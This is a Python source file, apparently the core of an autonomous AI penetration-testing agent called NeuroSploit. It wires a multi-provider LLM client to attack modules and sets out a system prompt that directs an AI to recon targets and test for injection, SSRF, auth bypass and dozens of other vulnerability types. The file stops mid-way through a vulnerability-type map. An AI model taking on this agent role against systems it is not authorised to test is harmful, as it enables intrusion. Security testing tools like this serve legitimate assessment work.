"""
NeuroSploit v3 - Autonomous AI Security Agent

REAL AI-powered penetration testing agent that:
1. Actually calls Claude/OpenAI API for intelligent analysis
2. Performs comprehensive reconnaissance
3. Tests vulnerabilities with proper verification (no false positives)
4. Generates detailed reports with CVSS, PoC, remediation
"""

import asyncio
import aiohttp
import json
import re
import os
import hashlib
from typing import Dict, List, Any, Optional, Callable, Tuple
from dataclasses import dataclass, field, asdict
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from enum import Enum
from pathlib import Path

from backend.core.agent_memory import AgentMemory
from backend.core.vuln_engine.registry import VulnerabilityRegistry
from backend.core.vuln_engine.payload_generator import PayloadGenerator
from backend.core.response_verifier import ResponseVerifier
from backend.core.negative_control import NegativeControlEngine
from backend.core.proof_of_execution import ProofOfExecution
from backend.core.confidence_scorer import ConfidenceScorer
from backend.core.validation_judge import ValidationJudge
from backend.core.vuln_engine.system_prompts import get_system_prompt, get_prompt_for_vuln_type
from backend.core.vuln_engine.ai_prompts import get_verification_prompt, get_poc_prompt
from backend.core.access_control_learner import AccessControlLearner
try:
    from backend.core.adaptive_learner import AdaptiveLearner
    HAS_ADAPTIVE_LEARNER = True
except ImportError:
    HAS_ADAPTIVE_LEARNER = False
    AdaptiveLearner = None
from backend.core.request_engine import RequestEngine, ErrorType
from backend.core.waf_detector import WAFDetector
from backend.core.strategy_adapter import StrategyAdapter
from backend.core.chain_engine import ChainEngine
from backend.core.auth_manager import AuthManager

# Phase 1: Reasoning + Budget + Tasks
try:
    from backend.core.token_budget import TokenBudget
    HAS_TOKEN_BUDGET = True
except ImportError:
    HAS_TOKEN_BUDGET = False
    TokenBudget = None

try:
    from backend.core.reasoning_engine import ReasoningEngine
    HAS_REASONING = True
except ImportError:
    HAS_REASONING = False
    ReasoningEngine = None

try:
    from backend.core.agent_tasks import AgentTaskManager, create_test_task
    HAS_AGENT_TASKS = True
except ImportError:
    HAS_AGENT_TASKS = False
    AgentTaskManager = None

# Phase 2: Enumeration + Intelligence
try:
    from backend.core.endpoint_classifier import EndpointClassifier
    HAS_ENDPOINT_CLASSIFIER = True
except ImportError:
    HAS_ENDPOINT_CLASSIFIER = False
    EndpointClassifier = None

try:
    from backend.core.cve_hunter import CVEHunter
    HAS_CVE_HUNTER = True
except ImportError:
    HAS_CVE_HUNTER = False
    CVEHunter = None

try:
    from backend.core.deep_recon import DeepRecon
    HAS_DEEP_RECON = True
except ImportError:
    HAS_DEEP_RECON = False
    DeepRecon = None

try:
    from backend.core.banner_analyzer import BannerAnalyzer
    HAS_BANNER_ANALYZER = True
except ImportError:
    HAS_BANNER_ANALYZER = False
    BannerAnalyzer = None

# Phase 3: Testing + Payload Intelligence
try:
    from backend.core.payload_mutator import PayloadMutator
    HAS_PAYLOAD_MUTATOR = True
except ImportError:
    HAS_PAYLOAD_MUTATOR = False
    PayloadMutator = None

try:
    from backend.core.param_analyzer import ParameterAnalyzer
    HAS_PARAM_ANALYZER = True
except ImportError:
    HAS_PARAM_ANALYZER = False
    ParameterAnalyzer = None

try:
    from backend.core.xss_validator import XSSValidator
    HAS_XSS_VALIDATOR = True
except ImportError:
    HAS_XSS_VALIDATOR = False
    XSSValidator = None

# Phase 3.5: Request Repeater + Site Analyzer
try:
    from backend.core.request_repeater import RequestRepeater
    HAS_REQUEST_REPEATER = True
except ImportError:
    HAS_REQUEST_REPEATER = False
    RequestRepeater = None

try:
    from backend.core.site_analyzer import SiteAnalyzer
    HAS_SITE_ANALYZER = True
except ImportError:
    HAS_SITE_ANALYZER = False
    SiteAnalyzer = None

# Phase 4: Exploit Generation + Validation
try:
    from backend.core.exploit_generator import ExploitGenerator
    HAS_EXPLOIT_GENERATOR = True
except ImportError:
    HAS_EXPLOIT_GENERATOR = False
    ExploitGenerator = None

try:
    from backend.core.poc_validator import PoCValidator
    HAS_POC_VALIDATOR = True
except ImportError:
    HAS_POC_VALIDATOR = False
    PoCValidator = None

# Phase 5: Multi-Agent Orchestration
try:
    from backend.core.agent_orchestrator import AgentOrchestrator
    HAS_MULTI_AGENT = True
except ImportError:
    HAS_MULTI_AGENT = False
    AgentOrchestrator = None

# Researcher AI Agent (0-day discovery with Kali sandbox)
try:
    from backend.core.researcher_agent import ResearcherAgent
    HAS_RESEARCHER = True
except ImportError:
    HAS_RESEARCHER = False
    ResearcherAgent = None

# CLI Agent Runner (AI CLI tools inside Kali sandbox)
try:
    from backend.core.cli_agent_runner import CLIAgentRunner
    HAS_CLI_AGENT = True
except ImportError:
    HAS_CLI_AGENT = False
    CLIAgentRunner = None

# Phase 5.5: Markdown-based Agent Orchestration (post-recon agent dispatch)
try:
    from backend.core.md_agent import MdAgentOrchestrator
    HAS_MD_AGENTS = True
except ImportError:
    HAS_MD_AGENTS = False
    MdAgentOrchestrator = None

# Phase 6: Per-Vulnerability-Type Agent Orchestration
try:
    from backend.core.vuln_orchestrator import VulnOrchestrator
    HAS_VULN_AGENTS = True
except ImportError:
    HAS_VULN_AGENTS = False
    VulnOrchestrator = None

# Phase 7: Checkpoint persistence for crash-resilient resume
try:
    from backend.core.checkpoint_manager import CheckpointManager
    HAS_CHECKPOINT = True
except ImportError:
    HAS_CHECKPOINT = False
    CheckpointManager = None

# Phase 8: Smart Router (multi-provider failover)
try:
    from backend.core.smart_router import get_router, HAS_SMART_ROUTER
except ImportError:
    HAS_SMART_ROUTER = False
    get_router = None

try:
    from core.browser_validator import BrowserValidator, embed_screenshot, HAS_PLAYWRIGHT
except ImportError:
    HAS_PLAYWRIGHT = False
    BrowserValidator = None
    embed_screenshot = None

# Try to import anthropic for Claude API
try:
    import anthropic
    ANTHROPIC_AVAILABLE = True
except ImportError:
    ANTHROPIC_AVAILABLE = False
    anthropic = None



# Try to import openai
try:
    import openai
    OPENAI_AVAILABLE = True
except ImportError:
    OPENAI_AVAILABLE = False
    openai = None

# Phase 9: RAG Engine (semantic retrieval, few-shot examples, reasoning templates)
try:
    from backend.core.rag import RAGEngine, FewShotSelector, ReasoningMemory, ReasoningTrace, FailureRecord
    from backend.core.rag.reasoning_templates import format_reasoning_prompt
    HAS_RAG = True
except ImportError:
    HAS_RAG = False
    RAGEngine = None
    FewShotSelector = None
    ReasoningMemory = None

# Pentest Playbook (100 vuln-type testing methodologies)
try:
    from backend.core.vuln_engine.pentest_playbook import (
        get_playbook_entry, get_testing_prompts, get_bypass_strategies,
        get_verification_checklist, build_agent_testing_prompt,
        get_anti_fp_rules, get_chain_attacks, get_playbook_summary,
    )
    HAS_PLAYBOOK = True
except ImportError:
    HAS_PLAYBOOK = False

# Security sandbox (Docker-based real tools)
try:
    from core.sandbox_manager import get_sandbox, SandboxManager
    HAS_SANDBOX = True
except ImportError:
    HAS_SANDBOX = False


class OperationMode(Enum):
    """Agent operation modes"""
    RECON_ONLY = "recon_only"
    FULL_AUTO = "full_auto"
    PROMPT_ONLY = "prompt_only"
    ANALYZE_ONLY = "analyze_only"
    AUTO_PENTEST = "auto_pentest"
    CLI_AGENT = "cli_agent"
    FULL_LLM_PENTEST = "full_llm_pentest"


class FindingSeverity(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class CVSSScore:
    """CVSS 3.1 Score"""
    score: float
    severity: str
    vector: str


@dataclass
class Finding:
    """Vulnerability finding with full details"""
    id: str
    title: str
    severity: str
    vulnerability_type: str = ""
    cvss_score: float = 0.0
    cvss_vector: str = ""
    cwe_id: str = ""
    description: str = ""
    affected_endpoint: str = ""
    parameter: str = ""
    payload: str = ""
    evidence: str = ""
    request: str = ""
    response: str = ""
    impact: str = ""
    poc_code: str = ""
    remediation: str = ""
    references: List[str] = field(default_factory=list)
    screenshots: List[str] = field(default_factory=list)
    affected_urls: List[str] = field(default_factory=list)
    ai_verified: bool = False
    confidence: str = "0"         # Numeric string "0"-"100"
    confidence_score: int = 0     # Numeric confidence score 0-100
    confidence_breakdown: Dict = field(default_factory=dict)  # Scoring breakdown
    proof_of_execution: str = ""  # What proof was found
    negative_controls: str = ""   # Control test results
    ai_status: str = "confirmed"  # "confirmed" | "rejected" | "pending"
    rejection_reason: str = ""
    double_checked: bool = False
    evidence_request: str = ""   # Full HTTP request for report evidence
    evidence_response: str = ""  # Full HTTP response for report evidence


@dataclass
class ReconData:
    """Reconnaissance data"""
    subdomains: List[str] = field(default_factory=list)
    live_hosts: List[str] = field(default_factory=list)
    endpoints: List[Dict] = field(default_factory=list)
    parameters: Dict[str, List[str]] = field(default_factory=dict)
    technologies: List[str] = field(default_factory=list)
    forms: List[Dict] = field(default_factory=list)
    js_files: List[str] = field(default_factory=list)
    api_endpoints: List[str] = field(default_factory=list)


def _get_endpoint_url(ep) -> str:
    """Safely get URL from endpoint (handles both str and dict)"""
    if isinstance(ep, str):
        return ep
    elif isinstance(ep, dict):
        return ep.get("url", "")
    return ""


def _get_endpoint_method(ep) -> str:
    """Safely get method from endpoint"""
    if isinstance(ep, dict):
        return ep.get("method", "GET")
    return "GET"


class LLMClient:
    """Unified LLM client for Claude, OpenAI, Ollama, and Gemini"""

    # Ollama and LM Studio endpoints
    OLLAMA_URL = os.getenv("OLLAMA_URL", "http://localhost:11434")
    LMSTUDIO_URL = os.getenv("LMSTUDIO_URL", "http://localhost:1234")
    GEMINI_URL = "https://generativelanguage.googleapis.com/v1beta"

    def __init__(self, preferred_provider: Optional[str] = None, preferred_model: Optional[str] = None):
        self.anthropic_key = os.getenv("ANTHROPIC_API_KEY", "")
        self.openai_key = os.getenv("OPENAI_API_KEY", "")
        self.google_key = os.getenv("GEMINI_API_KEY", "") or os.getenv("GOOGLE_API_KEY", "")
        self.together_key = os.getenv("TOGETHER_API_KEY", "")
        self.fireworks_key = os.getenv("FIREWORKS_API_KEY", "")
        self.openrouter_key = os.getenv("OPENROUTER_API_KEY", "")
        self.azure_openai_key = os.getenv("AZURE_OPENAI_API_KEY", "")
        self.azure_openai_endpoint = os.getenv("AZURE_OPENAI_ENDPOINT", "")
        self.azure_openai_api_version = os.getenv("AZURE_OPENAI_API_VERSION", "2024-02-01")
        self.azure_openai_deployment = os.getenv("AZURE_OPENAI_DEPLOYMENT", "")
        self.codex_key = os.getenv("CODEX_API_KEY", "")
        self.nim_key = os.getenv("NIM_API_KEY", "")
        self.ollama_model = os.getenv("OLLAMA_MODEL", "llama3.2")
        self.configured_model = os.getenv("DEFAULT_LLM_MODEL", "")  # User-configured model name
        self.client = None
        self.provider = None
        self.model_name = None  # Actual model name being used
        self.error_message = None
        self.connection_tested = False
        self._smart_router = None
        self._preferred_provider = preferred_provider  # User-selected provider for SmartRouter
        self._preferred_model = preferred_model  # User-selected model for SmartRouter

        # Try SmartRouter first (multi-provider failover)
        if HAS_SMART_ROUTER and get_router:
            router = get_router()
            if router:
                self._smart_router = router
                self.provider = "smart_router"
                self.client = "smart_router"
                if preferred_provider and preferred_model:
                    self.model_name = f"{preferred_provider}/{preferred_model}"
                elif preferred_model:
                    self.model_name = preferred_model
                elif preferred_provider:
                    self.model_name = f"{preferred_provider} (auto)"
                else:
                    self.model_name = "auto"
                print(f"[LLM] SmartRouter active (provider={preferred_provider or 'auto'}, model={preferred_model or 'auto'})")
                return

        # Validate keys are not placeholder values
        if self.anthropic_key in ["", "your-anthropic-api-key"]:
            self.anthropic_key = None
        if self.openai_key in ["", "your-openai-api-key"]:
            self.openai_key = None
        if self.google_key in ["", "your-google-api-key"]:
            self.google_key = None
        if self.together_key in ["", "your-together-api-key"]:
            self.together_key = None
        if self.fireworks_key in ["", "your-fireworks-api-key"]:
            self.fireworks_key = None
        if self.openrouter_key in ["", "your-openrouter-api-key"]:
            self.openrouter_key = None
        if self.codex_key in ["", "your-codex-api-key"]:
            self.codex_key = None
        if self.azure_openai_key in ["", "your-azure-openai-api-key"]:
            self.azure_openai_key = None

        # Try providers in order of preference
        self._initialize_provider()

    def _initialize_provider(self):
        """Initialize the first available LLM provider"""
        # 0. Try NVIDIA NIM (NVIDIA's OpenAI-compatible endpoint)
        if self.nim_key:
            self.client = "nim"  # Placeholder - uses HTTP requests
            self.provider = "nim"
            self.model_name = self.configured_model or os.getenv("NIM_MODEL", "openai/gpt-oss-120b")
            print(f"[LLM] NVIDIA NIM initialized (model: {self.model_name})")
            return

        # 1. Try Claude (Anthropic)
        if ANTHROPIC_AVAILABLE and self.anthropic_key:
            try:
                self.client = anthropic.Anthropic(api_key=self.anthropic_key)
                self.provider = "claude"
                self.model_name = self.configured_model or "claude-sonnet-4-20250514"
                print(f"[LLM] Claude API initialized (model: {self.model_name})")
                return
            except Exception as e:
                self.error_message = f"Claude init error: {e}"
                print(f"[LLM] Claude initialization failed: {e}")

        # 2. Try OpenAI
        if OPENAI_AVAILABLE and self.openai_key:
            try:
                self.client = openai.OpenAI(api_key=self.openai_key)
                self.provider = "openai"
                self.model_name = self.configured_model or "gpt-4o"
                print(f"[LLM] OpenAI API initialized (model: {self.model_name})")
                return
            except Exception as e:
                self.error_message = f"OpenAI init error: {e}"
                print(f"[LLM] OpenAI initialization failed: {e}")

        # 2a. Try Azure OpenAI
        if OPENAI_AVAILABLE and self.azure_openai_key and self.azure_openai_endpoint:
            try:
                self.client = openai.AzureOpenAI(
                    api_key=self.azure_openai_key,
                    api_version=self.azure_openai_api_version,
                    azure_endpoint=self.azure_openai_endpoint,
                )
                self.provider = "azure_openai"
                self.model_name = self.azure_openai_deployment or self.configured_model or "gpt-4o"
                print(f"[LLM] Azure OpenAI initialized (deployment: {self.model_name})")
                return
            except Exception as e:
                self.error_message = f"Azure OpenAI init error: {e}"
                print(f"[LLM] Azure OpenAI initialization failed: {e}")

        # 2b. Try Codex (OpenAI-compatible)
        if OPENAI_AVAILABLE and self.codex_key:
            try:
                self.client = openai.OpenAI(api_key=self.codex_key)
                self.provider = "codex"
                self.model_name = self.configured_model or "codex-mini-latest"
                print(f"[LLM] Codex API initialized (model: {self.model_name})")
                return
            except Exception as e:
                self.error_message = f"Codex init error: {e}"
                print(f"[LLM] Codex initialization failed: {e}")

        # 3. Try Google Gemini
        if self.google_key:
            self.client = "gemini"  # Placeholder - uses HTTP requests
            self.provider = "gemini"
            self.model_name = self.configured_model or "gemini-pro"
            print(f"[LLM] Gemini API initialized (model: {self.model_name})")
            return

        # 4. Try OpenRouter (multi-model gateway)
        if self.openrouter_key:
            self.client = "openrouter"
            self.provider = "openrouter"
            self.model_name = self.configured_model or "anthropic/claude-sonnet-4-20250514"
            print(f"[LLM] OpenRouter API initialized (model: {self.model_name})")
            return

        # 5. Try Together AI
        if self.together_key:
            self.client = "together"
            self.provider = "together"
            self.model_name = self.configured_model or "meta-llama/Llama-3.3-70B-Instruct-Turbo"
            print(f"[LLM] Together AI initialized (model: {self.model_name})")
            return

        # 6. Try Fireworks AI
        if self.fireworks_key:
            self.client = "fireworks"
            self.provider = "fireworks"
            self.model_name = self.configured_model or "accounts/fireworks/models/llama-v3p3-70b-instruct"
            print(f"[LLM] Fireworks AI initialized (model: {self.model_name})")
            return

        # 7. Try Ollama (local)
        if self._check_ollama():
            self.client = "ollama"  # Placeholder - uses HTTP requests
            self.provider = "ollama"
            self.model_name = self.configured_model or self.ollama_model
            print(f"[LLM] Ollama initialized with model: {self.model_name}")
            return

        # 8. Try LM Studio (local)
        if self._check_lmstudio():
            self.client = "lmstudio"  # Placeholder - uses HTTP requests
            self.provider = "lmstudio"
            self.model_name = self.configured_model or ""
            print("[LLM] LM Studio initialized")
            return

        # No provider available
        self._set_no_provider_error()

    def _check_ollama(self) -> bool:
        """Check if Ollama is running locally"""
        try:
            import requests
            response = requests.get(f"{self.OLLAMA_URL}/api/tags", timeout=2)
            return response.status_code == 200
        except Exception:
            return False

    def _check_lmstudio(self) -> bool:
        """Check if LM Studio is running locally"""
        try:
            import requests
            response = requests.get(f"{self.LMSTUDIO_URL}/v1/models", timeout=2)
            return response.status_code == 200
        except Exception:
            return False

    def _set_no_provider_error(self):
        """Set appropriate error message when no provider is available"""
        errors = []
        if not ANTHROPIC_AVAILABLE and not OPENAI_AVAILABLE:
            errors.append("LLM libraries not installed (run: pip install anthropic openai)")
        all_keys = [self.anthropic_key, self.openai_key, self.google_key,
                     self.openrouter_key, self.together_key, self.fireworks_key, self.codex_key]
        if not any(all_keys):
            errors.append("No API keys configured (set ANTHROPIC_API_KEY, OPENAI_API_KEY, OPENROUTER_API_KEY, GEMINI_API_KEY, TOGETHER_API_KEY, or FIREWORKS_API_KEY)")
        if not self._check_ollama():
            errors.append("Ollama not running locally")
        if not self._check_lmstudio():
            errors.append("LM Studio not running locally")

        self.error_message = "No LLM provider available. " + "; ".join(errors)
        print(f"[LLM] WARNING: {self.error_message}")

    def is_available(self) -> bool:
        return self.client is not None or self._smart_router is not None

    def get_status(self) -> dict:
        """Get LLM status for debugging"""
        status = {
            "available": self.is_available(),
            "provider": self.provider,
            "model": self.model_name,
            "preferred_provider": self._preferred_provider,
            "preferred_model": self._preferred_model,
            "error": self.error_message,
            "anthropic_lib": ANTHROPIC_AVAILABLE,
            "openai_lib": OPENAI_AVAILABLE,
            "ollama_available": self._check_ollama(),
            "lmstudio_available": self._check_lmstudio(),
            "has_nim_key": bool(self.nim_key),
            "has_google_key": bool(self.google_key),
            "has_together_key": bool(self.together_key),
            "has_fireworks_key": bool(self.fireworks_key),
            "has_openrouter_key": bool(self.openrouter_key),
            "has_codex_key": bool(self.codex_key),
            "smart_router_enabled": self._smart_router is not None,
        }
        if self._smart_router:
            status["smart_router_status"] = self._smart_router.get_status()
        return status

    async def test_connection(self) -> Tuple[bool, str]:
        """Test if the API connection is working"""
        if not self.client:
            return False, self.error_message or "No LLM client configured"

        try:
            # Simple test prompt
            result = await self.generate("Say 'OK' if you can hear me.", max_tokens=10)
            if result:
                self.connection_tested = True
                return True, f"Connected to {self.provider}"
            return False, f"Empty response from {self.provider}"
        except Exception as e:
            return False, f"Connection test failed for {self.provider}: {str(e)}"

    async def generate(self, prompt: str, system: str = "", max_tokens: int = 4096) -> str:
        """Generate response from LLM"""
        if not self.client:
            raise LLMConnectionError(self.error_message or "No LLM provider available")

        default_system = "You are an expert penetration tester and security researcher. Provide accurate, technical, and actionable security analysis. Be precise and avoid false positives."

        # SmartRouter delegation with fallback
        if self._smart_router:
            try:
                result = await self._smart_router.generate(
                    prompt=prompt,
                    system=system or default_system,
                    max_tokens=max_tokens,
                    preferred_provider=self._preferred_provider,
                    model=self._preferred_model,
                )
                # Update model_name with what was actually used
                if self._smart_router._last_provider:
                    new_name = f"{self._smart_router._last_provider}/{self._smart_router._last_model}"
                    if new_name != self.model_name:
                        self.model_name = new_name
                        print(f"[LLM] Using: {self._smart_router._last_account_label} → {new_name}")
                return result
            except Exception as e:
                print(f"[LLM] SmartRouter failed, falling back to direct: {e}")
                # Fall through to direct provider logic if available
                if not self.anthropic_key and not self.openai_key and not self.google_key:
                    raise LLMConnectionError(f"SmartRouter failed and no direct provider: {e}")

        try:
            if self.provider == "claude":
                message = self.client.messages.create(
                    model=self.model_name or "claude-sonnet-4-20250514",
                    max_tokens=max_tokens,
                    system=system or default_system,
                    messages=[{"role": "user", "content": prompt}]
                )
                return message.content[0].text

            elif self.provider == "nim":
                return await self._generate_openai_compatible(
                    prompt, system or default_system, max_tokens,
                    url=os.getenv("NIM_BASE_URL", "https://integrate.api.nvidia.com/v1/chat/completions"),
                    api_key=self.nim_key,
                    model=self.model_name or "openai/gpt-oss-120b",
                )

            elif self.provider == "openai":
                response = self.client.chat.completions.create(
                    model=self.model_name or "gpt-4o",
                    max_tokens=max_tokens,
                    messages=[
                        {"role": "system", "content": system or default_system},
                        {"role": "user", "content": prompt}
                    ]
                )
                return response.choices[0].message.content

            elif self.provider == "codex":
                response = self.client.chat.completions.create(
                    model=self.model_name or "codex-mini-latest",
                    max_tokens=max_tokens,
                    messages=[
                        {"role": "system", "content": system or default_system},
                        {"role": "user", "content": prompt}
                    ]
                )
                return response.choices[0].message.content

            elif self.provider == "azure_openai":
                response = self.client.chat.completions.create(
                    model=self.model_name or "gpt-4o",
                    max_tokens=max_tokens,
                    messages=[
                        {"role": "system", "content": system or default_system},
                        {"role": "user", "content": prompt}
                    ]
                )
                return response.choices[0].message.content

            elif self.provider == "gemini":
                return await self._generate_gemini(prompt, system or default_system, max_tokens)

            elif self.provider == "openrouter":
                return await self._generate_openai_compatible(
                    prompt, system or default_system, max_tokens,
                    url="https://openrouter.ai/api/v1/chat/completions",
                    api_key=self.openrouter_key,
                    model=self.model_name or "anthropic/claude-sonnet-4-20250514",
                    extra_headers={"HTTP-Referer": "https://neurosploit.ai", "X-Title": "NeuroSploit"},
                )

            elif self.provider == "together":
                return await self._generate_openai_compatible(
                    prompt, system or default_system, max_tokens,
                    url="https://api.together.xyz/v1/chat/completions",
                    api_key=self.together_key,
                    model=self.model_name or "meta-llama/Llama-3.3-70B-Instruct-Turbo",
                )

            elif self.provider == "fireworks":
                return await self._generate_openai_compatible(
                    prompt, system or default_system, max_tokens,
                    url="https://api.fireworks.ai/inference/v1/chat/completions",
                    api_key=self.fireworks_key,
                    model=self.model_name or "accounts/fireworks/models/llama-v3p3-70b-instruct",
                )

            elif self.provider == "ollama":
                return await self._generate_ollama(prompt, system or default_system)

            elif self.provider == "lmstudio":
                return await self._generate_lmstudio(prompt, system or default_system, max_tokens)

        except LLMConnectionError:
            raise
        except Exception as e:
            error_msg = str(e)
            print(f"[LLM] Error from {self.provider}: {error_msg}")
            raise LLMConnectionError(f"API call failed ({self.provider}): {error_msg}")

        return ""

    async def _generate_openai_compatible(
        self, prompt: str, system: str, max_tokens: int,
        url: str = "", api_key: str = "", model: str = "",
        extra_headers: dict = None,
    ) -> str:
        """Generate using any OpenAI-compatible API (OpenRouter, Together, Fireworks)."""
        import aiohttp

        headers = {
            "Authorization": f"Bearer {api_key}",
            "Content-Type": "application/json",
        }
        if extra_headers:
            headers.update(extra_headers)

        payload = {
            "model": model,
            "messages": [
                {"role": "system", "content": system},
                {"role": "user", "content": prompt}
            ],
            "max_tokens": max_tokens,
        }

        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload, headers=headers,
                                     timeout=aiohttp.ClientTimeout(total=120)) as response:
                if response.status != 200:
                    error_text = await response.text()
                    raise LLMConnectionError(f"API error ({response.status}): {error_text[:500]}")
                data = await response.json()
                return data.get("choices", [{}])[0].get("message", {}).get("content", "")

    async def _generate_gemini(self, prompt: str, system: str, max_tokens: int) -> str:
        """Generate using Google Gemini API"""
        import aiohttp

        gemini_model = self.model_name or "gemini-pro"
        url = f"{self.GEMINI_URL}/models/{gemini_model}:generateContent?key={self.google_key}"
        payload = {
            "contents": [{"parts": [{"text": f"{system}\n\n{prompt}"}]}],
            "generationConfig": {"maxOutputTokens": max_tokens}
        }

        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=60)) as response:
                if response.status != 200:
                    error_text = await response.text()
                    raise LLMConnectionError(f"Gemini API error ({response.status}): {error_text}")
                data = await response.json()
                return data.get("candidates", [{}])[0].get("content", {}).get("parts", [{}])[0].get("text", "")

    async def _generate_ollama(self, prompt: str, system: str) -> str:
        """Generate using local Ollama"""
        import aiohttp

        url = f"{self.OLLAMA_URL}/api/generate"
        payload = {
            "model": self.model_name or self.ollama_model,
            "prompt": prompt,
            "system": system,
            "stream": False
        }

        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=120)) as response:
                if response.status != 200:
                    error_text = await response.text()
                    raise LLMConnectionError(f"Ollama error ({response.status}): {error_text}")
                data = await response.json()
                return data.get("response", "")

    async def _generate_lmstudio(self, prompt: str, system: str, max_tokens: int) -> str:
        """Generate using LM Studio (OpenAI-compatible)"""
        import aiohttp

        url = f"{self.LMSTUDIO_URL}/v1/chat/completions"
        payload = {
            "messages": [
                {"role": "system", "content": system},
                {"role": "user", "content": prompt}
            ],
            "max_tokens": max_tokens,
            "stream": False
        }

        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=120)) as response:
                if response.status != 200:
                    error_text = await response.text()
                    raise LLMConnectionError(f"LM Studio error ({response.status}): {error_text}")
                data = await response.json()
                return data.get("choices", [{}])[0].get("message", {}).get("content", "")


class LLMConnectionError(Exception):
    """Exception raised when LLM connection fails"""
    pass


DEFAULT_ASSESSMENT_PROMPT = """You are NeuroSploit, an elite autonomous penetration testing AI agent.
Your mission: identify real, exploitable vulnerabilities — zero false positives.

## METHODOLOGY (PTES/OWASP/WSTG aligned)

### Phase 1 — Reconnaissance & Fingerprinting
- Discover all endpoints, parameters, forms, API paths, WebSocket URLs
- Technology fingerprinting: language, framework, server, WAF, CDN
- Identify attack surface: file upload, auth endpoints, admin panels, GraphQL

### Phase 2 — Technology-Guided Prioritization
Select vulnerability types based on detected technology stack:
- PHP/Laravel → LFI, command injection, SSTI (Blade), SQLi, file upload
- Node.js/Express → NoSQL injection, SSRF, prototype pollution, SSTI (EJS/Pug)
- Python/Django/Flask → SSTI (Jinja2), command injection, IDOR, mass assignment
- Java/Spring → XXE, insecure deserialization, expression language injection, SSRF
- ASP.NET → path traversal, XXE, header injection, insecure deserialization
- API/REST → IDOR, BOLA, BFLA, JWT manipulation, mass assignment, rate limiting
- GraphQL → introspection, injection, DoS via nested queries
- WordPress → file upload, SQLi, XSS, exposed admin, plugin vulns

### Phase 3 — Active Testing (100 vuln types available)
**OWASP Top 10 2021 coverage:**
- A01 Broken Access Control: IDOR, BOLA, BFLA, privilege escalation, forced browsing, CORS
- A02 Cryptographic Failures: weak encryption/hashing, cleartext transmission, SSL issues
- A03 Injection: SQLi (error/union/blind/time), NoSQL, LDAP, XPath, command, SSTI, XSS, XXE
- A04 Insecure Design: business logic, race condition, mass assignment
- A05 Security Misconfiguration: headers, debug mode, directory listing, default creds
- A06 Vulnerable Components: outdated dependencies, insecure CDN
- A07 Auth Failures: JWT, session fixation, brute force, 2FA bypass, OAuth misconfig
- A08 Data Integrity: insecure deserialization, cache poisoning, HTTP smuggling
- A09 Logging Failures: log injection, improper error handling
- A10 SSRF: standard SSRF, cloud metadata SSRF

### Phase 4 — Verification (multi-signal)
Every finding MUST have:
1. Concrete HTTP evidence (request + response)
2. At least 2 verification signals OR high-confidence tester match
3. No speculative language — only confirmed exploitable issues
4. Screenshot capture when possible

### Phase 5 — Reporting
- Each finding: title, severity, CVSS 3.1, CWE, PoC, impact, remediation
- Prioritized by real-world exploitability
- Executive summary with risk rating

## CRITICAL RULES
- NEVER report theoretical/speculative vulnerabilities
- ALWAYS verify with real HTTP evidence before confirming
- Test systematically: every parameter, every endpoint, every form
- Use technology hints to select the most relevant tests
- Capture baseline responses before testing for accurate diff-based detection
"""


class AutonomousAgent:
    """
    AI-Powered Autonomous Security Agent

    Performs real security testing with AI-powered analysis
    """

    # Legacy vuln type → registry key mapping
    VULN_TYPE_MAP = {
        # Aliases → canonical registry keys
        "sqli": "sqli_error",
        "xss": "xss_reflected",
        "rce": "command_injection",
        "cors": "cors_misconfig",
        "lfi_rfi": "lfi",
        "file_inclusion": "lfi",
        "remote_code_execution": "command_injection",
        "broken_auth": "auth_bypass",
        "broken_access": "bola",
        "api_abuse": "rest_api_versioning",
        # Identity mappings — Injection (18)
        "sqli_error": "sqli_error", "sqli_union": "sqli_union",
        "sqli_blind": "sqli_blind", "sqli_time": "sqli_time",
        "command_injection": "command_injection", "ssti": "ssti",
        "nosql_injection": "nosql_injection", "ldap_injection": "ldap_injection",
        "xpath_injection": "xpath_injection", "graphql_injection": "graphql_injection",
        "crlf_injection": "crlf_injection", "header_injection": "header_injection",
        "email_injection": "email_injection",
        "expression_language_injection": "expression_language_injection",
        "log_injection": "log_injection", "html_injection": "html_injection",
        "csv_injection": "csv_injection", "orm_injection": "orm_injection",
        # XSS (5)
        "xss_reflected": "xss_reflected", "xss_stored": "xss_stored",
        "xss_dom": "xss_dom", "blind_xss": "blind_xss",
        "mutation_xss": "mutation_xss",
        # File Access (8)
        "lfi": "lfi", "rfi": "rfi", "path_traversal": "path_traversal",
        "xxe": "xxe", "file_upload": "file_upload",
        "arbitrary_file_read": "arbitrary_file_read",
        "arbitrary_file_delete": "arbitrary_file_delete", "zip_slip": "zip_slip",
        # Request Forgery (4)
        "ssrf": "ssrf", "ssrf_cloud": "ssrf_cloud",
        "csrf": "csrf", "cors_misconfig": "cors_misconfig",
        # Auth (8)
        "auth_bypass": "auth_bypass", "jwt_manipulation": "jwt_manipulation",
        "session_fixation": "session_fixation", "weak_password": "weak_password",
        "default_credentials": "default_credentials", "brute_force": "brute_force",
        "two_factor_bypass": "two_factor_bypass",
        "oauth_misconfiguration": "oauth_misconfiguration",
        # Authorization (6)
        "idor": "idor", "bola": "bola", "bfla": "bfla",
        "privilege_escalation": "privilege_escalation",
        "mass_assignment": "mass_assignment", "forced_browsing": "forced_browsing",
        # Client-Side (8)
        "clickjacking": "clickjacking", "open_redirect": "open_redirect",
        "dom_clobbering": "dom_clobbering",
        "postmessage_vulnerability": "postmessage_vulnerability",
        "websocket_hijacking": "websocket_hijacking",
        "prototype_pollution": "prototype_pollution",
        "css_injection": "css_injection", "tabnabbing": "tabnabbing",
        # Infrastructure (10)
        "security_headers": "security_headers", "ssl_issues": "ssl_issues",
        "http_methods": "http_methods", "directory_listing": "directory_listing",
        "debug_mode": "debug_mode", "exposed_admin_panel": "exposed_admin_panel",
        "exposed_api_docs": "exposed_api_docs",
        "insecure_cookie_flags": "insecure_cookie_flags",
        "http_smuggling": "http_smuggling", "cache_poisoning": "cache_poisoning",
        # Logic & Data (16)
        "race_condition": "race_condition", "business_logic": "business_logic",
        "rate_limit_bypass": "rate_limit_bypass",
